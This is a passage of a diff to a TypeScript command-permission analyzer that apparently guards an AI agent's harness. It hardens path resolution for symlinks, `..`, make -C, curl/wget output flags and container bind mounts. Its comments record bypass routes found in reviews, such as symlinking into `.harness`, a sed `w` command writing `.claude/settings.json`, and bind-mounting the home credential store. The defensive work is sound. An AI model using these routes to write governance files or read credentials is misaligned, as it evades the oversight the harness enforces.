+    else if (eq && tokens[i + 1] && !tokens[i + 1]!.startsWith('-')) out.push(...abs(tokens[i + 1]!));
     // buildx writes to the host with `--output type=local,dest=PATH` (and `-o` with the same value shape)
     const bx = /(?:^|,)dest=([^,\s]+)/.exec(t);
-    if (bx?.[1]) out.push(abs(bx[1]));
+    if (bx?.[1]) out.push(...abs(bx[1]));
   }
   return out;
 }
@@ -5770,7 +5837,11 @@ function isOrdinaryShellAssignment(name: string, value: string): boolean {
   // so a writable directory anyone can plant a `cc` in was read as a system directory (exit review 7).
   return added.every((p) => {
     const t = p.trim();
-    return /^\/(usr|opt|bin|sbin|Library|System)\b/.test(t) && /^\/(usr|opt|bin|sbin|Library|System)\b/.test(resolve(t));
+    // every reading of the entry: `/usr/lib/lnk/..` is the parent of the link's TARGET, which may not be /usr at all
+    const system = /^\/(usr|opt|bin|sbin|Library|System)\b/;
+    if (!system.test(t)) return false;
+    const c = pathCandidates('/', t);
+    return !c.dynamic && c.paths.length > 0 && c.paths.every((q) => system.test(q));
   });
 }
 
@@ -6391,7 +6462,8 @@ function parseMakefile(ctx: EvaluationContext, path: string, dir: string, depth 
           names.push(name);
           continue;
         }
-        const globDir = resolve(dir, name.includes('/') ? name.slice(0, name.lastIndexOf('/')) : '.');
+        // the directory make LISTS is the physical one: `include d/../*.mk` reads the parent of d's TARGET
+        const globDir = openedPath(dir, name.includes('/') ? name.slice(0, name.lastIndexOf('/')) || '/' : '.') ?? dir;
         const pattern = name.includes('/') ? name.slice(name.lastIndexOf('/') + 1) : name;
         const prefix = name.includes('/') ? name.slice(0, name.lastIndexOf('/') + 1) : '';
         const re = new RegExp('^' + pattern.replace(/[.+^${}()|\\]/g, '\\$&').replace(/\*/g, '[^/]*').replace(/\?/g, '[^/]') + '$');
@@ -6404,18 +6476,23 @@ function parseMakefile(ctx: EvaluationContext, path: string, dir: string, depth 
         // A PATTERN INCLUDE TAKES WHATEVER MATCHES WHEN MAKE RUNS, and an earlier unit of the same command may
         // have created a file that matches it. The directory listing is a snapshot from BEFORE that write, so
         // the pattern itself is recorded and the producer tests it against the ledger (self-attack).
-        model.pendingIncludes.push(resolve(dir, name));
+        model.pendingIncludes.push(`${globDir === '/' ? '' : globDir}/${pattern}`);
       }
       for (const name of names) {
         // AN INCLUDED MAKEFILE THAT IS ITSELF A TARGET IS REMADE, and make then re-executes itself with the new
         // file. What EGO read is a PRE-IMAGE of what will run, so the file it read cannot carry a positive claim
         // (exit review 7).
         if (model.rules.has(name)) model.unsupported.push(`an included makefile is remade by this makefile: ${name}`);
-        if (optional && !fileExists(resolve(dir, name))) {
-          model.pendingIncludes.push(resolve(dir, name));
+        const includePath = openedPath(dir, name);
+        if (includePath === null) {
+          model.unsupported.push(`include with a path that cannot be resolved: ${name}`);
           continue;
         }
-        const sub = parseMakefile(ctx, resolve(dir, name), dir, depth + 1);
+        if (optional && !fileExists(includePath)) {
+          model.pendingIncludes.push(includePath);
+          continue;
+        }
+        const sub = parseMakefile(ctx, includePath, dir, depth + 1);
         for (const [t, r] of sub.rules) {
           const existing = model.rules.get(t);
           if (existing) {
@@ -7214,8 +7291,9 @@ function gitSubjectRepository(
   for (let i = 1; i < tokens.length; i++) {
     const t = tokens[i]!;
     const eq = /^(?:--work-tree=|-C)(.+)$/.exec(t);
-    if ((t === '-C' || t === '--work-tree') && tokens[i + 1]) dir = resolve(dir, tokens[i + 1]!);
-    else if (eq) dir = resolve(dir, eq[1]!);
+    // `-C` is a chdir(2): `..` after a link is the parent of the link's TARGET, so the directory is the PHYSICAL one
+    if ((t === '-C' || t === '--work-tree') && tokens[i + 1]) dir = chdirPath(dir, tokens[i + 1]!) ?? dir;
+    else if (eq) dir = chdirPath(dir, eq[1]!) ?? dir;
   }
   // A subprocess per git segment is far too expensive — the kernel has a 60 ms budget and the regression corpus
   // is 200k commands — and the answer only depends on the directory, so it is memoised. The common case does not
@@ -7339,10 +7417,10 @@ function resolveScriptCommand(
     const texts: string[] = [];
     const unread: string[] = [];
     for (const f of candidates) {
-      const abs = isAbsolute(f) ? f : resolve(cwd, f);
-      const text = readInsideWorkspace(ctx, abs);
+      const abs = openedPath(cwd, f);
+      const text = abs === null ? null : readInsideWorkspace(ctx, abs);
       if (text !== null) texts.push(text);
-      else if (named.length || fileExists(abs)) unread.push(f);
+      else if (named.length || (abs !== null && fileExists(abs))) unread.push(f);
     }
     if (!texts.length)
       return {
@@ -7359,8 +7437,8 @@ function resolveScriptCommand(
       const ctxDir = /(?:^|\n)\s*"?context"?\s*[:=]\s*"([^"]+)"/.exec(text)?.[1] ?? '.';
       const files = [...text.matchAll(/(?:^|\n)\s*"?dockerfile"?\s*[:=]\s*"([^"]+)"/g)].map((m) => m[1]!);
       for (const f of files.length ? files : [`${ctxDir}/Dockerfile`]) {
-        const abs = resolve(cwd, isAbsolute(f) ? f : `${ctxDir}/${f}`.replace(/^\.\//, ''));
-        const dt = readInsideWorkspace(ctx, abs);
+        const abs = openedPath(cwd, isAbsolute(f) ? f : `${ctxDir}/${f}`.replace(/^\.\//, ''));
+        const dt = abs === null ? null : readInsideWorkspace(ctx, abs);
         if (dt === null) gaps.push({ what: 'body', where: f, why: 'a Dockerfile this bake file names could not be read' });
         else lines.push(...dockerfileShellLines(dt));
       }
@@ -7398,7 +7476,8 @@ function resolveScriptCommand(
         (() => {
           const redir = /(?:^|\s)<\s*([^\s<>|&;]+)/.exec(env.rawSegment ?? norm)?.[1];
           if (redir === undefined || /[$`*?]/.test(redir)) return undefined;
-          return readInsideWorkspace(ctx, isAbsolute(redir) ? redir : resolve(cwd, redir)) ?? undefined;
+          const redirFile = openedPath(cwd, redir);
+          return (redirFile === null ? null : readInsideWorkspace(ctx, redirFile)) ?? undefined;
         })();
       if (piped === undefined)
         return {
@@ -7441,10 +7520,22 @@ function resolveScriptCommand(
     // PODMAN'S DEFAULT BUILD FILE IS `Containerfile`, and it falls back to `Dockerfile`. Looking only for the
     // latter made `podman build .` on an ordinary podman project a proven absence over a file full of RUN lines.
     let dockerfile = named ?? `${context}/Dockerfile`;
-    if (named === null && !fileExists(resolve(cwd, dockerfile)) && fileExists(resolve(cwd, `${context}/Containerfile`)))
+    const present = (word: string): boolean => {
+      const o = openedPath(cwd, word);
+      return o !== null && fileExists(o);
+    };
+    if (named === null && !present(dockerfile) && present(`${context}/Containerfile`))
       dockerfile = `${context}/Containerfile`;
-    const abs = isAbsolute(dockerfile) ? dockerfile : resolve(cwd, dockerfile);
-    if (stale(abs))
+    const abs = openedPath(cwd, dockerfile);
+    if (abs === null)
+      return {
+        kind: 'shell-script',
+        key: `dockerfile:${dockerfile}`,
+        body: null,
+        reason: 'the Dockerfile path is built at run time',
+        resolution: 'UNREADABLE',
+      };
+    if (stale(abs, ...pathCandidates(cwd, dockerfile).paths))
       return { kind: 'shell-script', key: `dockerfile:${abs}`, body: null, reason: 'the Dockerfile is rewritten earlier in the same command', resolution: 'STALE' };
     const text = readInsideWorkspace(ctx, abs);
     if (text === null) {
@@ -7509,8 +7600,18 @@ function resolveScriptCommand(
       resolution: 'NOT_A_PRODUCER',
     };
   if (scriptPath !== null) {
-    const abs = isAbsolute(scriptPath) ? scriptPath : resolve(cwd, scriptPath);
-    if (stale(abs))
+    // THE FILE THAT RUNS is the physical one (`d/../run.sh` is beside the link's TARGET); the ledger is asked about every
+    // reading, because a write recorded under either name makes what was read stale
+    const abs = openedPath(cwd, scriptPath);
+    if (abs === null)
+      return {
+        kind: 'shell-script',
+        key: `script:${scriptPath}`,
+        body: null,
+        reason: 'the script path is built at run time',
+        resolution: 'UNREADABLE',
+      };
+    if (stale(abs, ...pathCandidates(cwd, scriptPath).paths))
       {
         // WHAT WAS READ IS STILL HANDED OVER. Staleness says "this may not be what runs" — it does not say the
         // contents are harmless, and returning a null body threw away a body that had already been read. A
@@ -7932,7 +8033,7 @@ function resolveScriptCommand(
     }
     // successive -C are CUMULATIVE in make: `make -C a -C b` enters a, then a/b (challenge 5, finding 17)
     let makeDir = cwd;
-    for (const d of cl.dirs) makeDir = resolve(makeDir, d);
+    for (const d of cl.dirs) makeDir = chdirPath(makeDir, d) ?? makeDir; // `-C` is a chdir(2): `..` is the parent of the directory REACHED
     const makeFiles: string[] = cl.files; // every -f/--file/--makefile: make reads them ALL, not just the last
     targets.push(...cl.goals);
     // the environment make was STARTED with: `V='git push …' make x` gives the recipe a `V` the makefile may never
@@ -7986,7 +8087,7 @@ function resolveScriptCommand(
         resolution: 'DYNAMIC',
       };
     const paths = makeFiles.length
-      ? makeFiles.map((f) => resolve(makeDir, f))
+      ? makeFiles.flatMap((f) => openedPath(makeDir, f) ?? [])
       : // GNU make's own precedence is GNUmakefile, then makefile, then Makefile. Reading them in the wrong order
         // named a file make never opens while claiming RESOLVED_COMPLETE (challenge 6, findings 2, 8, 20). The
         // candidate is resolved to the REAL directory entry: on a case-insensitive filesystem `makefile` and
@@ -11411,9 +11512,7 @@ const UNREAD_BODY = 'ego-body-unread';
  *  where a heredoc put it there; a pipe, a path outside the workspace, an unreadable or oversized file does not. */
 function bodyDocument(ctx: EvaluationContext, env: ExecutionEnvironment, operand: string): string | null {
   if (operand === '-') return env.stdinText ?? null;
-  const target = expandHome(operand, env.cwd);
-  if (target === null || /[$`*?[{]/.test(target)) return null;
-  return readInsideWorkspace(ctx, isAbsolute(target) ? target : resolve(env.cwd, target));
+  return readWordFile(ctx, env.cwd, operand);
 }
 
 /** THE BODY OF A FORGE WRITE IS PART OF WHAT IT DOES. `gh api -X PUT …/protection --input protection.json` and
@@ -12083,6 +12182,10 @@ function isPathLike(tok: string, cwdIsSensitive = false): boolean {
     tok.startsWith('/') ||
     tok.startsWith('$HOME') ||
     tok.startsWith('${HOME}') ||
+    tok.startsWith('$PWD') ||
+    tok.startsWith('${PWD}') ||
+    tok.startsWith('$OLDPWD') ||
+    tok.startsWith('${OLDPWD}') ||
     tok.startsWith('./') ||
     tok.startsWith('../') ||
     tok === '.' ||
@@ -12091,30 +12194,17 @@ function isPathLike(tok: string, cwdIsSensitive = false): boolean {
   );
 }
 
-function expandHome(tok: string, cwd?: string): string | null {
-  const home = homedir();
-  // A ONE-CHARACTER BRACKET CLASS IS THAT CHARACTER. `[h]` matches exactly `h` and nothing else, so
-  // `.[h]arness/runtime/decisions/d1.json` IS `.harness/runtime/decisions/d1.json` — which is how both zsh and
-  // bash opened it. Collapsed here rather than left as a glob, because a glob only reaches ASK and this
-  // spelling is not ambiguous at all: it names one path (exit review 10). A class with more than one character,
-  // a range or a negation stays a glob and keeps its opacity.
-  const t = tok.replace(/\[([^\]!^\\/-])\]/g, '$1');
-  // `~+` IS $PWD AND `~-` IS $OLDPWD — tilde expansion, not directory names. `~+/control-plane/permissions/
-  // matchers.md` is the live policy file, and resolving `~+` as an ordinary path COMPONENT put the real path
-  // one level too deep, where the root-anchored globs no longer matched it (exit review 10). `~-` is the
-  // previous directory, which this kernel does not track, so it stays opaque.
-  if (t === '~+' || t.startsWith('~+/')) return cwd === undefined ? null : cwd + t.slice(2);
-  if (t === '~-' || t.startsWith('~-/') || /^~[+-]?\d/.test(t)) return null; // the directory stack: not tracked
-  if (t === '~' || t.startsWith('~/')) return home + t.slice(1);
-  if (/^~[A-Za-z0-9_.-]+/.test(t)) return null; // another user's home: opaque
-  if (t.startsWith('$HOME')) return home + t.slice(5);
-  if (t.startsWith('${HOME}')) return home + t.slice(7);
-  return t;
+/** The part of a word that names a path: `--out=FILE` and `of=FILE` carry theirs after the `=`, an option alone carries none. */
+function pathValueOf(raw: string): string {
+  const eq = raw.indexOf('=');
+  if (raw.startsWith('-')) return eq > 0 ? raw.slice(eq + 1) : '';
+  return /^(of|if|dest|src|file)=/.test(raw) ? raw.slice(eq + 1) : raw;
 }
 
-/** Path-like tokens of a segment, resolved against the tracked cwd; tokens with unresolved variables are reported as dynamic. */
-function pathTokens(segment: string, cwd: string): Array<{ raw: string; abs: string | null; glob: boolean }> {
-  const out: Array<{ raw: string; abs: string | null; glob: boolean }> = [];
+/** Path-like tokens of a segment, read by the shared resolver in the tracked cwd (one entry per reading of each token);
+ *  tokens with unresolved variables are reported as dynamic. */
+function pathTokens(segment: string, cwd: string, old?: readonly string[]): PathEntry[] {
+  const out: PathEntry[] = [];
   const home = canonicalPath(homedir()).split(sep).join('/');
   const cwdIsSensitive =
     canonicalPath(cwd).split(sep).join('/') === home ||
@@ -12131,25 +12221,9 @@ function pathTokens(segment: string, cwd: string): Array<{ raw: string; abs: str
       : -1;
   for (const [idx, raw] of allTokens.entries()) {
     if (idx === 0 || idx === patternIndex) continue;
-    const eq = raw.indexOf('=');
-    const tok =
-      raw.startsWith('-') && eq > 0
-        ? raw.slice(eq + 1)
-        : raw.startsWith('-')
-          ? ''
-          : /^(of|if|dest|src|file)=/.test(raw)
-            ? raw.slice(eq + 1)
-            : raw;
+    const tok = pathValueOf(raw);
     if (!tok || !isPathLike(tok, cwdIsSensitive) || tok === '{}') continue;
-    const expanded = expandHome(tok, cwd);
-    if (expanded === null || /[$`]/.test(expanded)) {
-      out.push({ raw: tok, abs: null, glob: false });
-      continue;
-    }
-    const glob = /[*?[{]/.test(expanded);
-    const literal = glob ? expanded.slice(0, expanded.search(/[*?[{]/)) : expanded;
-    const abs = isAbsolute(literal) ? literal : resolve(cwd, literal);
-    out.push({ raw: tok, abs: canonicalPath(abs), glob });
+    out.push(...pathEntries(cwd, tok, old));
   }
   return out;
 }
@@ -12186,6 +12260,8 @@ function classifyShellPaths(
    *  that says so, which turned `sed -n '1w .claude/settings.json' README.md` into four bare tokens where the
    *  script is just `1w` (exit review 9). Only the destinations inside the script need it. */
   rawSeg: string = seg,
+  /** the directories `~-` and `$OLDPWD` may name here, when the command line has one */
+  old?: readonly string[],
 ): CapabilityHit[] {
   const hits: CapabilityHit[] = [];
   // operands are read with the redirections taken out (`cp x f 2>&1`: the destination is `f`); the regex tests below keep
@@ -12209,7 +12285,7 @@ function classifyShellPaths(
   const statementWords = new Set(
     (dbEscape?.statements ?? []).flatMap((s) => tokenize(s)).filter((w) => !w.includes('/')),
   );
-  const paths = pathTokens(bare, cwd).filter((p) => !patternWords.includes(p.raw) && !statementWords.has(p.raw));
+  const paths = pathTokens(bare, cwd, old).filter((p) => !patternWords.includes(p.raw) && !statementWords.has(p.raw));
   // A WRITER WHOSE OPERAND IS BUILT AT RUN TIME NAMES A FILE NOBODY CAN JUDGE. `tee "$(echo .harness/runtime/pin.json)"` and
   // `tee $f` reached ALLOW because only the destructive verbs reported an unreadable operand (exit review 11). An
   // approvable question, never a silent yes.
@@ -12312,12 +12388,8 @@ function classifyShellPaths(
       });
   if (dbEscape !== null)
     for (const [mode, dests] of [['Write', [...dbEscape.writes, ...dumped.files]], ['Read', dbEscape.reads]] as const)
-      for (const dest of dests) {
-        const expanded = expandHome(dest, cwd);
-        if (expanded === null || /[$`]/.test(expanded)) continue;
-        const w = classifyPath(table, ctx, mode, canonicalPath(isAbsolute(expanded) ? expanded : resolve(cwd, expanded)));
-        if (w.verdict !== 'ALLOW') hits.push({ ...w, via: `the client ${mode === 'Write' ? 'writes' : 'reads'} ${dest} (${w.via})`, segment: seg });
-      }
+      for (const dest of dests)
+        judgeInto(hits, table, ctx, mode, cwd, dest, seg, (v) => `the client ${mode === 'Write' ? 'writes' : 'reads'} ${dest} (${v})`, old);
   if (
     DB_CLIENT_HEADS.has(head) &&
     (DB_EXECUTES_UNREAD.test(readSurface) ||
@@ -12364,9 +12436,7 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
       if (at < 0 || t.startsWith('-')) continue;
       const rel = t.slice(at + 1).replace(/^[0-3]:/, '');
       if (!rel || /[$`*?]/.test(rel)) continue;
-      const abs = canonicalPath(isAbsolute(rel) ? rel : resolve(cwd, rel.replace(/^\.\//, '')));
-      const h = classifyPath(table, ctx, 'Read', abs);
-      if (h.verdict !== 'ALLOW') hits.push({ ...h, via: `git reads ${rel} out of history (${h.via})`, segment: seg });
+      judgeInto(hits, table, ctx, 'Read', cwd, rel.replace(/^\.\//, ''), seg, (v) => `git reads ${rel} out of history (${v})`, old);
     }
   }
   // `--secret src=PATH` HANDS A FILE TO THE BUILD. BuildKit mounts it inside the image at build time, so the
@@ -12374,9 +12444,7 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
   for (const m of seg.matchAll(/--secret[= ]\s*\S*?(?:^|,)(?:src|source|file)=([^,\s]+)/g)) {
     const v = m[1]!;
     if (/[$`*?]/.test(v)) continue;
-    const abs = canonicalPath(isAbsolute(v) ? v : resolve(cwd, v));
-    const h = classifyPath(table, ctx, 'Read', abs);
-    if (h.verdict !== 'ALLOW') hits.push({ ...h, via: `build secret from ${v} (${h.via})`, segment: seg });
+    judgeInto(hits, table, ctx, 'Read', cwd, v, seg, (via) => `build secret from ${v} (${via})`, old);
   }
   // A SYMLINK'S TARGET IS RELATIVE TO THE DIRECTORY THE LINK LIVES IN, not to the working directory. `ln -s
   // ../.harness k/h` creates `k/h` pointing at `<repo>/.harness` — one directory up FROM k — and resolving the
@@ -12400,42 +12468,28 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
       }
       ops.push(t);
     }
-    if (targetDir !== null && ops.length >= 1) {
-      const linkDir = isAbsolute(targetDir) ? targetDir : resolve(cwd, targetDir);
-      for (const src of ops) {
-        const expanded = expandHome(src, cwd);
-        if (expanded === null || /[$`*?]/.test(expanded)) continue;
-        const abs = canonicalPath(isAbsolute(expanded) ? expanded : resolve(linkDir, expanded));
-        const entry = paths.find((q) => q.raw === src);
-        if (entry) entry.abs = abs;
-        else paths.push({ raw: src, abs, glob: false });
-      }
-    } else if (ops.length >= 2) {
-      // ...AND WHEN THE LAST OPERAND IS AN EXISTING DIRECTORY, ln puts the link INSIDE it — its second
-      // documented form, on BSD and GNU alike. `ln -s ../.harness k` with `k` a directory creates
-      // `k/.harness -> ../.harness`, which is the same writable route into the governance tree this rule was
-      // written to close, one spelling over (self-attack on exit review 9).
-      const last = ops[ops.length - 1]!;
-      const lastAbs = isAbsolute(last) ? last : resolve(cwd, last);
-      const linkDir = directoryExists(lastAbs) ? lastAbs : dirname(lastAbs);
-      for (const src of ops.slice(0, -1)) {
-        const expanded = expandHome(src, cwd);
-        if (expanded === null || /[$`*?]/.test(expanded)) continue;
-        const abs = canonicalPath(isAbsolute(expanded) ? expanded : resolve(linkDir, expanded));
-        // the path entry is REPLACED rather than judged separately, so the protected-tree reasoning that already
-        // knows "a link to a directory that CONTAINS protected paths opens a route into them" applies unchanged
-        const entry = paths.find((q) => q.raw === src);
-        if (entry) entry.abs = abs;
-        else paths.push({ raw: src, abs, glob: false });
-        // ...AND THE JUDGEMENT IS MADE HERE TOO, not only through the shared path list. A link is a SECOND NAME
-        // for its target, so a link to a directory that CONTAINS protected paths opens a writable route into
-        // them — and routing that through the shared list made it depend on conditions further down that a
-        // producer body does not always meet (the corpus found `npm run` carrying it reaching ALLOW while the
-        // identical command alone was DENY).
-        const linkRoots = [...ctx.repoRoots, ...(ctx.cwd ? [ctx.cwd] : [])].map((r) =>
-          canonicalPath(r).split(sep).join('/'),
-        );
-        const linkPosix = abs.split(sep).join('/');
+    // A TARGET IS READ FROM EVERY DIRECTORY THE LINK MAY LIVE IN: the lexical reading and the physical one of the link's
+    // directory differ when a `..` follows a link, and the target is resolved from the real one when the link is opened
+    const retarget = (src: string, linkDirs: readonly string[], announce: boolean): void => {
+      const entries = pathEntries(linkDirs, src, old);
+      // a target nobody can enumerate keeps the entry the cwd reading made, which asks
+      if (entries.some((e) => e.glob) || (entries.length === 1 && entries[0]!.abs === null && entries[0]!.why === undefined)) return;
+      for (let i = paths.length - 1; i >= 0; i--) if (paths[i]!.raw === src) paths.splice(i, 1);
+      // the path entry is REPLACED rather than judged separately, so the protected-tree reasoning that already
+      // knows "a link to a directory that CONTAINS protected paths opens a route into them" applies unchanged
+      paths.push(...entries);
+      if (!announce) return;
+      // ...AND THE JUDGEMENT IS MADE HERE TOO, not only through the shared path list. A link is a SECOND NAME
+      // for its target, so a link to a directory that CONTAINS protected paths opens a writable route into
+      // them — and routing that through the shared list made it depend on conditions further down that a
+      // producer body does not always meet (the corpus found `npm run` carrying it reaching ALLOW while the
+      // identical command alone was DENY).
+      const linkRoots = [...ctx.repoRoots, ...(ctx.cwd ? [ctx.cwd] : [])].map((r) =>
+        canonicalPath(r).split(sep).join('/'),
+      );
+      for (const entry of entries) {
+        if (entry.abs === null) continue;
+        const linkPosix = entry.abs.split(sep).join('/');
         for (const pp of table.protectedPaths) {
           if (pp.tool === 'Read') continue;
           const prefix = pp.path
@@ -12458,6 +12512,18 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
           break;
         }
       }
+    };
+    if (targetDir !== null && ops.length >= 1) {
+      const linkDirs = pathCandidates(cwd, targetDir, old).paths;
+      for (const src of ops) retarget(src, linkDirs.length ? linkDirs : [cwd], false);
+    } else if (ops.length >= 2) {
+      // ...AND WHEN THE LAST OPERAND IS AN EXISTING DIRECTORY, ln puts the link INSIDE it — its second
+      // documented form, on BSD and GNU alike. `ln -s ../.harness k` with `k` a directory creates
+      // `k/.harness -> ../.harness`, which is the same writable route into the governance tree this rule was
+      // written to close, one spelling over (self-attack on exit review 9).
+      const last = ops[ops.length - 1]!;
+      const linkDirs = pathCandidates(cwd, last, old).paths.map((c) => (directoryExists(c) ? c : dirname(c)));
+      for (const src of ops.slice(0, -1)) retarget(src, linkDirs.length ? linkDirs : [cwd], true);
     }
   }
   // CARGO'S CONFIGURATION NAMES PROGRAMS. `[build] rustc-wrapper`, `linker`, `runner` and `credential-process` in
@@ -12475,7 +12541,7 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
     for (let i = 1; i < tokens.length; i++) {
       const v = tokens[i] === '--config' ? tokens[i + 1] : tokens[i]!.startsWith('--config=') ? tokens[i]!.slice(9) : undefined;
       // KEY=VALUE overrides are judged by the text matcher; a bare PATH is a file to merge
-      if (v !== undefined && !v.includes('=') && !/[$`*?]/.test(v)) cfgFiles.push(isAbsolute(v) ? v : resolve(cwd, v));
+      if (v !== undefined && !v.includes('=') && !/[$`*?]/.test(v)) cfgFiles.push(...(openedPath(cwd, v) ?? []));
     }
     for (const f of cfgFiles) {
       const text = readInsideWorkspace(ctx, f);
@@ -12500,7 +12566,7 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
     for (const t of tokens.slice(1)) {
       if (!t.startsWith('@') || t.length < 2 || /[$`*?]/.test(t)) continue;
       const rf = t.slice(1);
-      const text = readInsideWorkspace(ctx, isAbsolute(rf) ? rf : resolve(cwd, rf));
+      const text = readWordFile(ctx, cwd, rf);
       if (text === null) {
         hits.push({
           capability: 'command.script-opaque',
@@ -12532,10 +12598,8 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
   // which would have made reading a governed file a write and reintroduced the defect closed one commit ago.
   for (const w of sedWrittenFiles(rawSeg, ctx, cwd)) {
     // a device sink is a DISCARD, exactly as it is for `> /dev/null` (self-attack on exit review 9)
-    if (/[$`]/.test(w) || isDeviceDiscard(w)) continue;
-    const abs = canonicalPath(isAbsolute(w) ? w : resolve(cwd, w));
-    const h = classifyPath(table, ctx, 'Write', abs);
-    if (h.verdict !== 'ALLOW') hits.push({ ...h, via: `sed writes ${w} (${h.via})`, segment: seg });
+    if (/[$`]/.test(w) || discardWord(cwd, w)) continue;
+    judgeInto(hits, table, ctx, 'Write', cwd, w, seg, (v) => `sed writes ${w} (${v})`, old);
   }
   // EVERY RUNTIME THE MODEL KNOWS, not two of them. The privileged-mount MATCHER already named nerdctl, so the
   // command was recognised as a bind mount of `/` and asked — while the identical docker line was denied,
@@ -12543,8 +12607,8 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
   // matchers name and the analyzer does not is a hole with a sign on it.
   if (/^(docker|podman|nerdctl)$/.test(head)) {
     for (const src of containerMountSources(tokenize(seg))) {
-      const expanded = expandHome(src) ?? src;
-      if (/[$`]/.test(expanded)) {
+      const entries = pathEntries(cwd, src, old);
+      if (entries.some((e) => e.abs === null && e.why === undefined)) {
         hits.push({
           capability: 'command.unknown',
           verdict: verdictFor(table, ctx, 'command.unknown'),
@@ -12554,23 +12618,28 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
         });
         continue;
       }
-      const abs = canonicalPath(isAbsolute(expanded) ? expanded : resolve(cwd, expanded));
-      // a bind mount is read-write by default: judge it as BOTH, and keep whichever is more restrictive
-      for (const tool of ['Write', 'Read'] as const) {
-        const h = classifyPath(table, ctx, tool, abs);
-        if (h.verdict !== 'ALLOW')
-          hits.push({ ...h, via: `bind mount source ${src} (${h.via})`, segment: seg });
+      for (const entry of entries) {
+        if (entry.abs === null) {
+          hits.push({ ...unknownHit(table, ctx, `bind mount source ${src}: ${entry.why}`), segment: seg });
+          continue;
+        }
+        // a bind mount is read-write by default: judge it as BOTH, and keep whichever is more restrictive
+        for (const tool of ['Write', 'Read'] as const) {
+          const h = classifyPath(table, ctx, tool, entry.lex ?? entry.abs);
+          if (h.verdict !== 'ALLOW')
+            hits.push({ ...h, via: `bind mount source ${src} (${h.via})`, segment: seg });
+        }
+        const posix = entry.abs.split(sep).join('/');
+        const homePosix = canonicalPath(homedir()).split(sep).join('/');
+        if (posix === homePosix || homePosix.startsWith(posix + '/') || posix === '/')
+          hits.push({
+            capability: 'fs.credential-store.read',
+            verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
+            via: `bind mount of ${src} hands the container every credential store under it`,
+            segment: seg,
+            absolute: false,
+          });
       }
-      const posix = abs.split(sep).join('/');
-      const homePosix = canonicalPath(homedir()).split(sep).join('/');
-      if (posix === homePosix || homePosix.startsWith(posix + '/') || posix === '/')
-        hits.push({
-          capability: 'fs.credential-store.read',
-          verdict: verdictFor(table, ctx, 'fs.credential-store.read'),
-          via: `bind mount of ${src} hands the container every credential store under it`,
-          segment: seg,
-          absolute: false,
-        });
     }
   }
   const home = canonicalPath(homedir()).split(sep).join('/');
@@ -12609,6 +12678,9 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
     '--emit-decorator-metadata-to', '--declarationDir', '--declaration-dir', '--sourcemap-file', '--manifest',
     '--lockfile-path', '--cache-location', '--cacheLocation', '--output-document', '--write-to', '--save-to',
     '--log-file', '--result-file', '--junit', '--junit-xml', '--tap-file', '--profile-output',
+    // the files curl and wget write besides the body (a `-` is a stream and is skipped below)
+    '--dump-header', '--cookie-jar', '--trace', '--trace-ascii', '--stderr', '--etag-save', '--hsts', '--append-output',
+    '--save-cookies',
   ];
   // ...AND EVERY ONE OF THEM, not the last. A command may name two destinations — `esbuild --metafile=A
   // --outfile=B` — and taking only the last judged B while A was the governed file (exit review 10).
@@ -12617,11 +12689,20 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
   // NEXT WORD became a write target - `grep -rno .harness/runtime docs` searched for the pattern and was refused as
   // a write to the runtime directory (exit review 10). Only the long spellings count for these.
   const shortO = /^(ls|grep|egrep|fgrep|zgrep|rg|ag|ack|make|gmake|ps|ssh|scp|sftp|nm|lsof|column|mount|sudo|find)$/.test(head) ? '' : 'o';
-  for (const extra of optionValues(tokenize(seg), shortO, OUTPUT_FLAGS)) {
+  // ...AND A TOOL'S OWN SHORT LETTER for a file it writes, where the letter is not the generic `o`: `wget -O FILE` is the
+  // document (and `curl -O` takes no value at all), `wget -a FILE` the log it appends to, `curl -D FILE` the response
+  // headers, `curl -c FILE` the cookie jar. Each is scoped to the head that owns it, because `-c` is a command to psql and
+  // a flag to tar.
+  const ownShorts = /^(wget|wget2)$/.test(head) ? 'Oa' : head === 'curl' ? 'Dc' : '';
+  const outputValues = [
+    ...optionValues(tokenize(seg), shortO, OUTPUT_FLAGS),
+    ...[...ownShorts].flatMap((letter) => optionValues(tokenize(seg), letter, [])),
+  ];
+  for (const extra of outputValues) {
     if (!extra || extra.startsWith('-') || /[$`]/.test(extra)) continue;
-    const eAbs = canonicalPath(isAbsolute(extra) ? extra : resolve(cwd, extra));
-    const h = classifyPath(table, ctx, 'Write', eAbs);
-    if (h.verdict !== 'ALLOW') hits.push({ ...h, via: `output flag names ${extra} (${h.via})`, segment: seg });
+    // `curl -o /dev/null` DISCARDS: the same reader a redirection asks (isDiscardDevice) says so for an option's value too
+    if (discardWord(cwd, extra)) continue;
+    judgeInto(hits, table, ctx, 'Write', cwd, extra, seg, (v) => `output flag names ${extra} (${v})`, old);
   }
   const rawOutput =
     optionValue(tokenize(seg), shortO, OUTPUT_FLAGS) ??
@@ -12825,7 +12906,7 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
       if (fromFile !== null) {
         if (fromFile === '-') pathspecFileUnread = 'standard input';
         else {
-          const text = readInsideWorkspace(ctx, isAbsolute(fromFile) ? fromFile : resolve(cwd, fromFile));
+          const text = readWordFile(ctx, cwd, fromFile);
           if (text === null) pathspecFileUnread = fromFile;
           // `--pathspec-file-nul` separates with NUL instead of newlines
           else fileSpecs.push(...text.split(/\0|\r?\n/).map((l) => l.trim()).filter(Boolean));
@@ -12906,9 +12987,7 @@ function pathspecPath(spec: string, repoRoot: string | null): string | null {
       // ...and a sed script's own `w FILE` writes wherever it says, whatever the operands are (exit review 9)
       for (const w of sedWrittenFiles(rawSeg, ctx, cwd))
         if (!paths.some((q) => q.raw === w) && !/[$`]/.test(w)) {
-          const glob = /[*?[{]/.test(w);
-          const literal = glob ? w.slice(0, w.search(/[*?[{]/)) : w;
-          paths.push({ raw: w, abs: canonicalPath(isAbsolute(literal) ? literal : resolve(cwd, literal)), glob });
+          paths.push(...pathEntries(cwd, w, old));
           if (dest === null) dest = 'ALL';
         }
     } else if (
